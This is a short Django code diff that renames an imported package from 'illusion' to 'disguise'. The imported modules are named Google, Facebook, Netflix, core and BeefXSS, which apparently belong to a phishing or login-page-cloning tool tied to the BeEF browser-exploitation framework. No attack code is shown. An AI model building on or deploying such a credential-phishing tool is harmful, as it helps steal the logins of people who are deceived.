@@ -1,9 +1,9 @@
 from django.shortcuts import render, redirect
 from tldextract import extract
 from django.views.decorators.csrf import csrf_exempt
-from illusion.func import Google, Facebook, Netflix
-from illusion.func import core
-from illusion.func import BeefXSS
+from disguise.func import Google, Facebook, Netflix
+from disguise.func import core
+from disguise.func import BeefXSS
 
 
 def index(request):
